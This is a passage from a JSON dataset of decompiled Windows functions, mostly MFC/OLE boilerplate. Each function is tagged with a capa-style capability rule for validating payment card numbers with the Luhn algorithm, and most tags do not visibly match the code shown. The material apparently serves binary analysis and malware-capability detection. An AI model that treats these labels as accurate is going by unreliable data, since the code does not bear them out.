fcn.0041442c(*(iVar3 + 0x24));\n    iVar3 = *(iVar3 + 0x24);\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.004141f7(*(extraout_ECX + 0x24), -(iVar3 != 0) & *(unaff_EBP + 8), *(extraout_ECX + 0x30), \n                         *(unaff_EBP + -0x14), *(unaff_EBP + -0x10), unaff_EBP + -0x1c);\n    (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(extraout_ECX + 4);\n    if (iVar3 == 0) {\n        fcn.00411e0e();\n    }\n    puVar1 = *(unaff_EBP + 0x10);\n    puVar1[2] = 0;\n    *puVar1 = 1;\n    puVar1[1] = iVar3;\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 730
    },
    "004517d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004517d3(uint arg_8h)\n\n{\n    int32_t lpString2;\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x20);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    if ((extraout_ECX[0x1e] == 0) && (extraout_ECX[0x1f] == 0)) {\n        fcn.004294ba(*(unaff_EBP + 8));\n    }\n    else {\n        lpString2 = *(unaff_EBP + 8);\n        *(unaff_EBP + -0x14) = 0;\n        if (lpString2 != 0) {\n            iVar1 = fcn.0043f95c(extraout_ECX[9], lpString2);\n            extraout_ECX[0x20] = iVar1;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0;\n        if ((lpString2 != 0) && (extraout_ECX[0x20] == 0)) {\n            *(unaff_EBP + -0x14) = extraout_ECX[0x1f];\n            extraout_ECX[0x1f] = 0;\n            fcn.0041442c(lpString2);\n            *(unaff_EBP + -4) = 1;\n            iVar1 = (*_sym.imp.ole32.dll_StgCreateDocfile)(*(unaff_EBP + -0x1c), 0x11022, 0, unaff_EBP + -0x24);\n            if (iVar1 != 0) {\n                fcn.00413258(iVar1);\n            }\n            extraout_ECX[0x1f] = *(unaff_EBP + -0x24);\n            *(unaff_EBP + -4) = 0;\n            fcn.00402740();\n        }\n        (**(*extraout_ECX + 0xdc))(0);\n        if (lpString2 != 0) {\n            if ((extraout_ECX[0x21] == 0) || (extraout_ECX[0x20] != 0)) {\n                arg_8h_00 = 0;\n            }\n            else {\n                arg_8h_00 = 1;\n            }\n            fcn.00450e08(arg_8h_00, 0);\n            if (extraout_ECX[0x21] != 0) {\n                (**(*extraout_ECX + 0x5c))(0);\n            }\n            if (extraout_ECX[0x20] == 0) {\n                if (extraout_ECX[0x21] == 0) {\n                    (**(*extraout_ECX[0x1f] + 8))(extraout_ECX[0x1f]);\n                    extraout_ECX[0x1f] = *(unaff_EBP + -0x14);\n                }\n                else {\n                    (**(**(unaff_EBP + -0x14) + 8))(*(unaff_EBP + -0x14));\n                }\n            }\n        }\n        *(unaff_EBP + -0x20) = 1;\n        extraout_ECX[0x20] = 1;\n        extraout_ECX[0x21] = 1;\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 894
    },
    "004523d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004523d7(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    piVar1 = fcn.00431b42(0x49faa8);\n    iVar2 = (**(*piVar1 + 0x20))(piVar1, 4, 3, &var_8h);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ole32.dll_CreateStreamOnHGlobal)(0, 1, &var_4h);\n        if (iVar2 != 0) {\n            (**(*var_8h + 8))(var_8h);\n            fcn.00411e0e();\n        }\n        piVar1 = (*_sym.imp.ole32.dll_OleSaveToStream)(var_8h, var_4h);\n        (**(*var_8h + 8))(var_8h);\n        if (piVar1 == NULL) goto code_r0x0045244d;\n        (**(*var_4h + 8))(var_4h);\n        while( true ) {\n            fcn.00413258(piVar1);\ncode_r0x0045244d:\n            in_ECX = (*_sym.imp.ole32.dll_WriteClassStm)(var_4h, *(in_ECX[8] + 0x8c) + 0x28);\n            if (in_ECX == NULL) break;\n            (**(*var_4h + 8))(var_4h);\n            piVar1 = in_ECX;\n        }\n        arg_8h[2] = 0;\n        *arg_8h = 4;\n        arg_8h[1] = var_4h;\n        uVar3 = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 472
    },
    "00452491": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452491(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint arg_14h;\n    uint arg_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.00431b42(0x49faa8);\n    arg_14h = 0;\n    arg_18h = 0;\n    if (arg_8h != NULL) {\n        var_14h = *arg_8h;\n        var_10h = arg_8h[1];\n        fcn.00438bcf(&var_14h);\n        arg_14h = var_14h;\n        arg_18h = var_10h;\n    }\n    if (arg_ch == NULL) {\n        var_ch = 0;\n        var_8h = 0;\n    }\n    else {\n        var_ch = *arg_ch;\n        var_8h = arg_ch[1];\n        fcn.00438bcf(&var_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(in_ECX + 4);\n    iVar1 = fcn.004141f7(var_4h, 0, 1, arg_14h, arg_18h, &var_ch);\n    (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(in_ECX + 4);\n    if (iVar1 == 0) {\n        fcn.00411e0e();\n    }\n    arg_10h[2] = 0;\n    arg_10h[1] = iVar1;\n    *arg_10h = 1;\n    return;\n}\n",
        "token_count": 406
    },
    "004530a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004530a7(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 0x16) {\n        iVar1 = param_1 + 0x40000;\n    }\n    else {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 74
    },
    "00453799": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453799(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    iVar3 = 0;\n    puVar4 = unaff_ESI;\n    if (arg_8h != 0) goto code_r0x004537ad;\n    while( true ) {\n        fcn.00411e42();\n        puVar4 = unaff_ESI;\ncode_r0x004537ad:\n        if (arg_ch != iVar3) break;\n        unaff_ESI = 0x49b320;\n        do {\n            arg_8h_00 = *unaff_ESI;\n            iVar2 = fcn.00420f26(arg_8h_00);\n            if (iVar2 != 0) {\n                uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x20), 0xffffffff, arg_8h_00, puVar4);\n                iVar2 = fcn.00437984(uVar1);\n                if (0 < iVar2) goto code_r0x00453819;\n            }\n            if (((unaff_ESI[1] ^ *(arg_8h + 0x80)) & 0xf000) == 0) {\n                iVar3 = fcn.00420f26(*unaff_ESI);\n            }\n            unaff_ESI = unaff_ESI + 2;\n        } while (unaff_ESI < 0x49b340);\n        if (iVar3 != 0) break;\n    }\ncode_r0x00453819:\n    fcn.00438751(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 422
    },
    "00453ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453ae0(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 0x20) != 0) {\n        uVar1 = 0;\n        if (*(param_1 + 0x28) != 0) {\n            iVar2 = 0;\n            do {\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(*(iVar2 + 4 + *(param_1 + 0x20)));\n                (*_sym.imp.ole32.dll_ReleaseStgMedium)(iVar2 + 0x14 + *(param_1 + 0x20));\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + 0x24;\n            } while (uVar1 < *(param_1 + 0x28));\n        }\n        fcn.004115a4(*(param_1 + 0x20));\n        *(param_1 + 0x20) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "00453d5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453d5d(code **param_1)\n\n{\n    code **extraout_ECX;\n    code *pcVar1;\n    int32_t unaff_EBP;\n    uint *puVar2;\n    \n    pcVar1 = NULL;\n    *param_1 = vtable.CEnumFormatEtc.0;\n    if ((param_1[9] == NULL) && (param_1[0xc] != NULL)) {\n        puVar2 = param_1[10] + 4;\n        do {\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(*puVar2);\n            pcVar1 = pcVar1 + 1;\n            puVar2 = puVar2 + 5;\n        } while (pcVar1 < param_1[0xc]);\n    }\n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[9];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00431cc2();\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        fcn.004115a4(extraout_ECX[10]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00411a01();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 335
    },
    "00453fe3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453fe3(uint arg_8h, int16_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    \n    if (arg_ch == NULL) {\n        arg_ch = fcn.00412d0c(0, arg_8h, &var_14h);\n        *(arg_ch + 8) = 1;\n    }\n    if (arg_8h != 0) {\n        *arg_ch = arg_8h;\n    }\n    iVar1 = fcn.00453e7c(arg_ch, 1);\n    fcn.00462290(iVar1 + 0x14, 0, 0xc);\n    return;\n}\n",
        "token_count": 158
    },
    "00454080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00454080(int32_t param_1, ushort *param_2)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    ushort *puVar3;\n    \n    if (*(param_1 + 0x30) == *(param_1 + 0x3c)) {\n        iVar1 = (*(param_1 + 0x30) + 10) * 0x14;\n        uVar2 = fcn.00411579(-(iVar1 >> 0x20 != 0) | iVar1);\n        *(param_1 + 0x3c) = *(param_1 + 0x3c) + 10;\n        fcn.0041314e(uVar2, (*(param_1 + 0x30) + 10) * 0x14, *(param_1 + 0x28), *(param_1 + 0x30) * 0x14);\n        fcn.004115a4(*(param_1 + 0x28));\n        *(param_1 + 0x28) = uVar2;\n    }\n    puVar3 = *(param_1 + 0x30) * 0x14 + *(param_1 + 0x28);\n    *puVar3 = *param_2;\n    *(puVar3 + 2) = *(param_2 + 2);\n    *(puVar3 + 4) = *(param_2 + 4);\n    *(puVar3 + 6) = *(param_2 + 6);\n    *(puVar3 + 8) = *(param_2 + 8);\n    *(param_1 + 0x30) = *(param_1 + 0x30) + 1;\n    return;\n}\n",
        "token_count": 388
    },
    "00455a47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455a47(code **param_1)\n\n{\n    int32_t *piVar1;\n    uint unaff_ESI;\n    \n    *param_1 = vtable.COleFrameHook.0;\n    if ((param_1[8] != NULL) && (piVar1 = param_1[8] + 0x80,  *piVar1 == param_1)) {\n        *piVar1 = 0;\n    }\n    fcn.00402740();\n    if (param_1[4] != NULL) {\n        (**(param_1[4] + 0x1c))(unaff_ESI);\n    }\n    param_1[7] = NULL;\n    return;\n}\n",
        "token_count": 160
    },
    "00457760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00457760(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004656c9(param_1, param_2, param_3, param_4);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 79
    },
    "004579af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004579af(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    uint var_26ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x260);\n    iVar6 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x10) = 0x80004003;\n    if (iVar6 != 0) {\n        *(unaff_EBP + -0x10) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            iVar7 = *(unaff_EBP + 0x10);\n            if (iVar7 != 0) {\n                puVar3 = iVar6 + 4;\n                do {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 2;\n                    iVar7 = iVar7 + -1;\n                } while (iVar7 != 0);\n            }\n        }\n        else {\n            fcn.00457857(iVar6, *(unaff_EBP + 0x10), *(unaff_EBP + 0xc));\n            piVar1 = *(unaff_EBP + 0x18);\n            *(unaff_EBP + -4) = 0;\n            if (piVar1 == NULL) {\n                *(unaff_EBP + -0x20) = 0;\n            }\n            else {\n                *(unaff_EBP + -0x20) = *piVar1;\n            }\n            *(unaff_EBP + -0x40) = 0;\n            if (*(unaff_EBP + 0x10) != 0) {\n                do {\n                    *(unaff_EBP + -0x44) = *(iVar6 + *(unaff_EBP + -0x40) * 8);\n                    fcn.004576ad(*(unaff_EBP + 8), 1);\n                    *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + 1;\n                } while (*(unaff_EBP + -0x40) < *(unaff_EBP + 0x10));\n            }\n            if (((piVar1 != NULL) && (piVar1 + 3 != NULL)) && (*piVar1 != 0)) {\n                uVar4 = fcn.0043e469(unaff_EBP + 0x10, piVar1[2] + -1);\n                *(unaff_EBP + -4) = 1;\n                fcn.0041d369(uVar4);\n                *(unaff_EBP + -4) = 0;\n                fcn.00402740();\n                iVar6 = *(unaff_EBP + -0x14);\n                uVar2 = *(iVar6 + -0xc);\n                uVar5 = piVar1[2] - 1U;\n                if (uVar2 < piVar1[2] - 1U) {\n                    uVar5 = uVar2;\n                }\n                piVar1[1] = uVar5;\n                iVar6 = fcn.0043c05a(iVar6);\n                uVar4 = *(iVar6 + 0xc);\n                *(unaff_EBP + -4) = 2;\n                fcn.00457760(piVar1 + 3, piVar1[2], uVar4, 0xffffffff);\n                fcn.0043baea();\n            }\n            fcn.00402740();\n        }\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 956
    },
    "00457c64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00457c64(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 107
    },
    "00457c7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00457c7d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 104
    },
    "00458056": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458056(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe08;\n    \n    fcn.004627e2();\n    *extraout_ECX = vtable.COleStreamFile.0;\n    if ((extraout_ECX[4] != NULL) && (extraout_ECX[2] != NULL)) {\n        fcn.0045801a();\n    }\n    fcn.00402740();\n    fcn.0043fcc0();\n    *in_FS_OFFSET = uStackY532;\n    fcn.0045e747(in_stack_fffffe08);\n    return;\n}\n",
        "token_count": 152
    },
    "00458294": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458294(code *param_1)\n\n{\n    int32_t iVar1;\n    code **extraout_ECX;\n    int32_t **in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t *in_stack_fffffea0;\n    int32_t *piVar3;\n    uchar *puStack340;\n    uint uStack328;\n    uint in_stack_fffffebc;\n    uchar auStack268 [260];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ &stack0xfffffeac;\n    puStack340 = 0x8;\n    fcn.004627af();\n    fcn.0043fb1a();\n    *extraout_ECX = vtable.COleStreamFile.0;\n    fcn.0040f620();\n    extraout_ECX[4] = param_1;\n    fcn.0041372f();\n    piVar3 = extraout_ECX[4];\n    if (piVar3 != NULL) {\n        iVar2 = 0x4582fd;\n        iVar1 = (**(*piVar3 + 0x30))(piVar3, &stack0xfffffeac, 0);\n        in_stack_fffffea0 = piVar3;\n        if ((iVar1 == 0) && (puStack340 != NULL)) {\n            fcn.00413a89(puStack340);\n            in_stack_fffffea0 = piVar3;\n            if (0x103 < *(iVar2 + -0xc)) {\n                in_stack_fffffea0 = 0xffffffff;\n                iVar2 = fcn.004416ff(3, 0xffffffff, 0);\n            }\n            fcn.0043ff96(&stack0xfffffef4, iVar2);\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(puStack340);\n            puStack340 = &stack0xfffffef4;\n            fcn.00413a3a();\n            fcn.00402740();\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffea0;\n    uStack328 = 0x458372;\n    fcn.0045e747(in_stack_fffffebc);\n    return;\n}\n",
        "token_count": 482
    },
    "0045860e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045860e(int32_t *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_fffffe94;\n    int32_t *in_stack_fffffea0;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iStack340;\n    uint uStack328;\n    uint in_stack_fffffebc;\n    int32_t aiStack268 [65];\n    uint32_t uStack8;\n    \n    puVar3 = &stack0xfffffeac;\n    uStack8 = *0x4b8030 ^ puVar3;\n    iStack340 = 0x10;\n    fcn.004627af();\n    if ((param_1 != NULL) && (param_2 != 0)) {\n        in_stack_fffffea0 = param_1;\n        iVar1 = (**(*param_1 + 0x44))(param_1, puVar3, 0);\n        if ((iVar1 == 0) && (iStack340 != 0)) {\n            fcn.00413a89(iStack340);\n            uVar4 = 0;\n            fcn.0043ff96(&stack0xfffffef4, in_stack_fffffe94);\n            param_2 = iStack340;\n            (*_sym.imp.ole32.dll_CoTaskMemFree)();\n            in_stack_fffffea0 = &stack0xfffffef4;\n            fcn.00413a3a(in_stack_fffffea0, puVar3, uVar4);\n            fcn.00402740(in_stack_fffffea0, puVar3, 0xffffffff);\n        }\n        fcn.0041442c(param_2);\n        iVar2 = extraout_ECX + 0x10;\n        iVar1 = (**(*param_1 + 0xc))(param_1, param_2, param_3, 0, 0);\n        if ((iVar1 < 0) && (iVar2 != 0)) {\n            in_stack_fffffea0 = 0x4586eb;\n            iStack340 = iVar2;\n            fcn.00457f54(puVar3, iVar1);\n        }\n        fcn.00402740();\n    }\n    *in_FS_OFFSET = in_stack_fffffea0;\n    uStack328 = 0x45871c;\n    fcn.0045e747(in_stack_fffffebc);\n    return;\n}\n",
        "token_count": 561
    },
    "004595f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004595f0(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    uVar1 = *(param_1 + 0x2c);\n    bVar3 = uVar1 < *(param_1 + 0x30);\n    if (bVar3) {\n        iVar2 = *(param_1 + 0x20);\n        fcn.0041314e(param_2, iVar2, iVar2 * uVar1 + *(param_1 + 0x28), iVar2);\n        *(param_1 + 0x2c) = *(param_1 + 0x2c) + 1;\n    }\n    return bVar3;\n}\n",
        "token_count": 176
    },
    "0045ad2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045ad2b(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffdfc;\n    \n    fcn.004627e2();\n    *extraout_ECX = vtable.COleObjectFactory.0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0045a70b();\n        fcn.0043026e();\n        fcn.0043039f(0);\n        fcn.00430a21(extraout_ECX);\n        uStackY532 = 0;\n        fcn.0043040c();\n    }\n    fcn.00411a01();\n    *in_FS_OFFSET = uStackY532;\n    fcn.0045e747(in_stack_fffffdfc);\n    return;\n}\n",
        "token_count": 186
    },
    "0045ba0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0045ba0c(int32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if ((-1 < param_2) && (param_2 < *(param_1 + 8))) {\n        return param_2 * 0xc + *(param_1 + 4);\n    }\n    fcn.00411e42();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 124
    },
    "0045bad3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bad3(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    bool bVar7;\n    \n    iVar6 = arg_8h;\n    bVar7 = -1 < arg_8h;\n    arg_8h = 0;\n    if (bVar7) goto code_r0x0045bae9;\n    do {\n        fcn.00411e42();\ncode_r0x0045bae9:\n        if (arg_8h <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar6 == arg_8h) {\n            if (*(in_ECX + 4) != arg_8h) {\n                iVar6 = 0;\n                if (*(in_ECX + 8) != arg_8h && arg_8h <= *(in_ECX + 8)) {\n                    do {\n                        fcn.0045ba7e();\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < *(in_ECX + 8));\n                }\n                fcn.004115a4(*(in_ECX + 4));\n                *(in_ECX + 4) = arg_8h;\n            }\n            *(in_ECX + 0xc) = arg_8h;\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        if (*(in_ECX + 4) == arg_8h) {\n            arg_8h = iVar6;\n            if (iVar6 <= *(in_ECX + 0x10)) {\n                arg_8h = *(in_ECX + 0x10);\n            }\n            uVar1 = fcn.00411579(arg_8h * 0xc);\n            *(in_ECX + 4) = uVar1;\n            fcn.00462290(uVar1, 0, arg_8h * 0xc);\n            if (0 < iVar6) {\n                iVar4 = 0;\n                iVar5 = iVar6;\n                do {\n                    puVar2 = *(in_ECX + 4) + iVar4;\n                    if (puVar2 != NULL) {\n                        *puVar2 = 0;\n                        puVar2[1] = 0;\n                    }\n                    iVar4 = iVar4 + 0xc;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            goto code_r0x0045bcc7;\n        }\n        if (iVar6 <= *(in_ECX + 0xc)) {\n            iVar5 = *(in_ECX + 8);\n            if (iVar5 < iVar6) {\n                fcn.00462290(iVar5 * 0xc + *(in_ECX + 4), arg_8h, (iVar6 - iVar5) * 0xc);\n                iVar5 = 0;\n                if (iVar6 != *(in_ECX + 8) && -1 < iVar6 - *(in_ECX + 8)) {\n                    do {\n                        piVar3 = (*(in_ECX + 8) + iVar5) * 0xc + *(in_ECX + 4);\n                        if (piVar3 != NULL) {\n                            *piVar3 = arg_8h;\n                            piVar3[1] = arg_8h;\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < iVar6 - *(in_ECX + 8));\n                }\n            }\n            else if ((iVar6 < iVar5) && (iVar5 != iVar6 && -1 < iVar5 - iVar6)) {\n                do {\n                    fcn.0045ba7e();\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < *(in_ECX + 8) - iVar6);\n            }\n            goto code_r0x0045bccd;\n        }\n        iVar5 = *(in_ECX + 0x10);\n        if (iVar5 == arg_8h) {\n            iVar5 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar5 < 4) {\n                iVar5 = 4;\n            }\n            else if (0x400 < iVar5) {\n                iVar5 = 0x400;\n            }\n        }\n        arg_8h = iVar5 + *(in_ECX + 0xc);\n        if (arg_8h <= iVar6) {\n            arg_8h = iVar6;\n        }\n    } while (arg_8h < *(in_ECX + 0xc));\n    iVar5 = fcn.00411579(arg_8h * 0xc);\n    fcn.0041314e(iVar5, arg_8h * 0xc, *(in_ECX + 4), *(in_ECX + 8) * 0xc);\n    fcn.00462290(*(in_ECX + 8) * 0xc + iVar5, 0, (iVar6 - *(in_ECX + 8)) * 0xc);\n    iVar4 = 0;\n    if (iVar6 != *(in_ECX + 8) && -1 < iVar6 - *(in_ECX + 8)) {\n        do {\n            puVar2 = (*(in_ECX + 8) + iVar4) * 0xc + iVar5;\n            if (puVar2 != NULL) {\n                *puVar2 = 0;\n                puVar2[1] = 0;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar6 - *(in_ECX + 8));\n    }\n    fcn.004115a4(*(in_ECX + 4));\n    *(in_ECX + 4) = iVar5;\ncode_r0x0045bcc7:\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0045bccd:\n    *(in_ECX + 8) = iVar6;\n    return;\n}\n",
        "token_count": 1381
    },
    "0045be80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0045be80(int32_t param_1, int32_t param_2)\n\n{\n    uint unaff_retaddr;\n    \n    if (param_2 < 0) {\n        fcn.00411e42();\n    }\n    if (*(param_1 + 8) <= param_2) {\n        fcn.0045bad3(param_2 + 1, 0xffffffff);\n    }\n    fcn.0045bd5d(unaff_retaddr);\n    return;\n}\n",
        "token_count": 112
    },
    "0045beda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045beda(char *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    \n    fcn.0041442c(arg_8h);\n    if (*arg_8h == '{') {\n        uVar1 = (*_sym.imp.ole32.dll_CLSIDFromString)();\n    }\n    else {\n        uVar1 = (*_sym.imp.ole32.dll_CLSIDFromProgID)(arg_8h, arg_ch);\n    }\n    fcn.00402740();\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "0045c5de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
